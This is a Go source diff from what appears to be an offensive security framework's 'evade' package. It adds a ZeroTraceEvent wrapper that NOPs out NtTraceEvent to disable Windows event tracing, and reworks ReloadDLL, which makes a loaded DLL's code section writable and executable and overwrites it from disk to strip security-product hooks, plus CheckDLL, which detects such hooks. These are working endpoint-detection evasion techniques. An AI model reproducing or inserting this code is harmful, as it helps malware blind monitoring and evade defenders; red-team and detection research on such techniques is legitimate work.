@@ -7,12 +7,34 @@ import (
 	"debug/pe"
 	"io"
 	"os"
+	"sync"
 	"unsafe"
 
+	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
-	"golang.org/x/sys/windows"
 )
+
+var zteOnce struct {
+	sync.Once
+	e error
+}
+
+// ZeroTraceEvent will attempt to zero out the NtTraceEvent function call with
+// a NOP.
+//
+// This will return an error if it fails.
+//
+// This is just a wrapper for the winapi function call as we want to keep the
+// function body in winapi for easy crypt wrapping.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+func ZeroTraceEvent() error {
+	zteOnce.Do(func() {
+		zteOnce.e = winapi.ZeroTraceEvent()
+	})
+	return zteOnce.e
+}
 
 // ReloadDLL is a function shamelessly stolen from the sliver project. This
 // function will read a DLL file from on-disk and rewrite over it's current
@@ -46,22 +68,22 @@ func ReloadDLL(d string) error {
 		f.Close()
 		return err
 	}
-	s := p.Section(".text")
+	s := p.Section(sect)
 	if f.Close(); s == nil {
-		return xerr.New("reload: cannot find '.text' section")
+		return xerr.Sub("cannot find '.text' section", 0x9)
 	}
 	var (
 		v = b[s.Offset:s.Size]
-		x *windows.DLL
+		x uintptr
 	)
-	if x, err = windows.LoadDLL(d); err != nil {
+	if x, err = winapi.LoadDLL(d); err != nil {
 		return err
 	}
 	var (
-		i = uintptr(x.Handle) + uintptr(s.VirtualAddress)
+		i = x + uintptr(s.VirtualAddress)
 		o uint32
 	)
-	if err = windows.VirtualProtect(i, uintptr(len(v)), windows.PAGE_EXECUTE_READWRITE, &o); err != nil {
+	if err = winapi.VirtualProtect(i, uint64(len(v)), 0x40, &o); err != nil {
 		return err
 	}
 	if bugtrack.Enabled {
@@ -77,7 +99,7 @@ func ReloadDLL(d string) error {
 		//            fucking lol.
 		(*(*[1]byte)(unsafe.Pointer(i + uintptr(a))))[0] = v[a]
 	}
-	if err = windows.VirtualProtect(i, uintptr(len(v)), o, &o); bugtrack.Enabled {
+	if err = winapi.VirtualProtect(i, uint64(len(v)), o, &o); bugtrack.Enabled {
 		bugtrack.Track("evade.ReloadDLL(): DLL reload complete, d=%s, err=%s.", d, err)
 	}
 	return err
@@ -89,16 +111,6 @@ func isBaseName(n string) bool {
 		}
 	}
 	return true
-}
-func fullPath(n string) string {
-	if !isBaseName(n) {
-		return n
-	}
-	d, err := windows.GetSystemDirectory()
-	if err != nil {
-		d = `C:\Windows\System32`
-	}
-	return d + "\\" + n
 }
 
 // CheckDLL is a similar function to ReloadDLL.
@@ -125,21 +137,18 @@ func CheckDLL(d string) (bool, error) {
 		f.Close()
 		return false, err
 	}
-	s := p.Section(".text")
+	s := p.Section(sect)
 	if f.Close(); s == nil {
-		f.Close()
-		return false, xerr.New("reload: cannot find '.text' section")
+		return false, xerr.Sub("cannot find '.text' section", 0x9)
 	}
 	var (
 		v = b[s.Offset:s.Size]
-		x *windows.DLL
+		x uintptr
 	)
-	if x, err = windows.LoadDLL(d); err != nil {
-		f.Close()
+	if x, err = winapi.LoadDLL(d); err != nil {
 		return false, err
 	}
-	i := uintptr(x.Handle) + uintptr(s.VirtualAddress)
-	for a := 0; a < len(v); a++ {
+	for a, i := 0, uintptr(x)+uintptr(s.VirtualAddress); a < len(v); a++ {
 		if (*(*[1]byte)(unsafe.Pointer(i + uintptr(a))))[0] != v[a] {
 			if bugtrack.Enabled {
 				bugtrack.Track("evade.CheckDLL(): Hook for d=%s detected at %X!", d, i+uintptr(a))
